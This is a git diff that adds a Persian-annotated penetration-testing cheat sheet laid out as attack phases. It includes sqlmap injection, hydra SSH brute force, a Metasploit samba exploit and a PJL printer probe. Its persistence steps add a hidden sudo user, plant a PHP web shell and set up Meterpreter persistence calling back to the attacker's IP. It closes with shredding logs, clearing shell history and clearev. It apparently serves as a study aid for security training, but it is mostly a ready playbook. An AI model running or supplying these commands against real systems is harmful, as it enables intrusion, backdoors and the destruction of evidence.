@@ -8,20 +8,139 @@ Internal	❌				✅			❌	     ✅✅✅✅
 کشف دستگاه‌های فعال در شبکه
 sudo netdiscover -r 192.168.1.0/24
 
-Nmap Tool : [
+[
+  1. Reconnaissance :
+    [
+      passive : جمع آوری اطلاعات از منابع عمومی
+      [
+        // دریافت نام و ادرس و تماس صاحب سرور ها
+        whois ["website"]
 
-# اسکن کامل با تمام قابلیت‌ها
-sudo nmap -sS -sV -sC -O -p- -T4 -v -oA full_scan 192.168.1.100
+        // بررسی اطلاعات dns 
+        nslookup ["website"]
+        dig any ["website"]
 
-# -sS: SYN Stealth Scan
-# -sV: شناسایی سرویس/نسخه
-# -sC: اجرای اسکریپت‌های پیش‌فرض
-# -O: شناسایی سیستم عامل
-# -p-: همه پورت‌ها (1-65535)
-# -T4: سرعت تهاجمی
-# -v: نمایش جزئیات
-# -oA: خروجی همه فرمت‌ها
+        // جستجو subdomain
+        sublist3r -d ["website"]
+        amass enum -d ["website"]
+      ] 
 
+      active : جمع‌آوری اطلاعات از منابع محدود و خصوصی
+      [
+        netdiscover -r [ip]
+        nmap -sn [ bound ips]
+      ]
+    ]
+
+  2. Scanning : 
+    [
+      port scaning : 
+      [
+        quick scan => nmap -sS -T4 [ip]
+        all scan => nmap -p- -T4 [ip] -oN [file name and address]
+      ]
+      service detection :
+      [
+        nmap -sV -sC -O [ip]
+      ]
+      vulnerabile scaning : 
+      [
+        secure script => nmap --script vuln [ip]
+        web app => nikto -h [ip]
+      ]
+
+    ]
+  
+  3. Gaining Access :
+    [
+      web app attacking :
+      [
+        sqlmap -u ["url + /login.php?user=admin&pass=test"] --level=3 --risk=2
+        if sucsess : ["url + /login.php?user=admin&pass=test"] --dbs 
+      ]
+      samba : 
+      [
+        shared list : smbclient -l [ip] -N 
+        connection : smbclient //[ip]/public -N
+        search file : smb:\ ...
+      ]
+
+      brute force :
+      [
+        hydra -l users.txt -P /usr/share/wordlists/rockyou.txt [ip] ssh -t 4
+      ]
+      
+      metasploit : اگرsamba آسیب بذیر بود
+      [
+        msfconsole 
+        search samba 4.7.6
+        use exploit/linux/samba/is_known_pipename
+        set RHOSTS [ip]
+        exploit
+        meterpreter > shell 
+        whoami
+      ]
+
+      printer attack : 
+      [
+        echo "@PJL INFO ID" | [ip] 9100 
+      ]
+    ]
+
+  4. Maintaining Access :
+    [
+      create backdoor :
+      [
+        0. useradd -r -m -s /bin/bash hiddenuser
+        1. add hidden user => chpasswd
+        2. add to sudo => tee -a /etc/sudoers
+        3. setup ssh key [
+          ssh-keygen -f ['name']
+          ssh-copy-id -i ['name'].pub [username]@[ip]
+        ]
+      ]
+
+      web shell : 
+      [
+        1. upload php shell => echo '<?php system($_GET["cmd"]); ?> /var/www/html/shell.php'
+        2. access => curl "[ip]/shel.php?cmd=whoami"
+      ]
+
+      persistence with metasploit :
+      [
+        meterpreter > run persistence -S -U -i 60 -p 4444 -r [ip]
+        // -s : اجرا هنگام راه اندازی
+        // -U : اجرا هنگام لاگین کاربر
+        // -i : اتصال ۶۰ ثانیه
+        // -p : port
+        // -r : ip kali
+      ]
+    ]
+
+  5. Covering Track:
+    [
+      clear logs => shred -zu [/var/log/fils]
+      clear history => history -c , rm ~/.bash_history
+      clear temp file => rm -f /[var,tmp,dev]/[www,shm,backdoor] , meterpreter > clearev
+      change date files
+    ]
+]
+
+
+
+Nmap Tool :
+[ 
+  # اسکن کامل با تمام قابلیت‌ها
+
+  sudo nmap -sS -sV -sC -O -p- -T4 -v -oA full_scan 192.168.1.100
+  # -sS: SYN Stealth Scan
+  # -sV: شناسایی سرویس/نسخه
+  # -sC: اجرای اسکریپت‌های پیش‌فرض
+  # -O: شناسایی سیستم عامل
+  # -p-: همه پورت‌ها (1-65535)
+  # -T4: سرعت تهاجمی
+  # -v: نمایش جزئیات
+  # -oA: خروجی همه فرمت‌ها
 
 # کشف دستگاه‌های شبکه
 nmap -sn 192.168.1.0/24
@@ -84,5 +203,4 @@ while true; do
   date >> network_log.txt
   sleep 300  # هر 5 دقیقه
 done
-
 ]
